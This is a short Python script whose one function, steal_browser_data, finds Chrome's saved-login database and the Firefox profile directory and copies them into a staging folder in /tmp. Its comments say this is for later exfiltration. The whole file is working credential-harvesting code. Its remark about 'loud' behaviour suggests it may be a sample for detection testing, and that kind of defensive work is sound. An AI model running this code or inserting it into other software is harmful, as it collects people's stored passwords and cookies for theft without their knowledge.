import os
import shutil

def steal_browser_data():
    """Attempts to locate and copy browser login/cookie databases."""
    home = os.path.expanduser("~")
    # Paths for Chrome (Windows example) and Firefox (Linux example)
    paths = [
        os.path.join(home, "AppData/Local/Google/Chrome/User Data/Default/Login Data"),
        os.path.join(home, ".mozilla/firefox/")
    ]
    
    staged_dir = "/tmp/staged_creds"
    if not os.path.exists(staged_dir):
        os.makedirs(staged_dir)

    for path in paths:
        if os.path.exists(path):
            print(f"Found sensitive path: {path}")
            # Instead of reading, we copy the database for later exfiltration
            target_name = os.path.basename(path) if not os.path.isdir(path) else "firefox_profile"
            try:
                if os.path.isdir(path):
                    # For directories, just copy the whole thing (very loud behavior)
                    shutil.copytree(path, os.path.join(staged_dir, "ff_data"), dirs_exist_ok=True)
                else:
                    shutil.copy2(path, os.path.join(staged_dir, target_name))
            except Exception as e:
                print(f"Failed to stage {path}: {e}")

if __name__ == "__main__":
    steal_browser_data()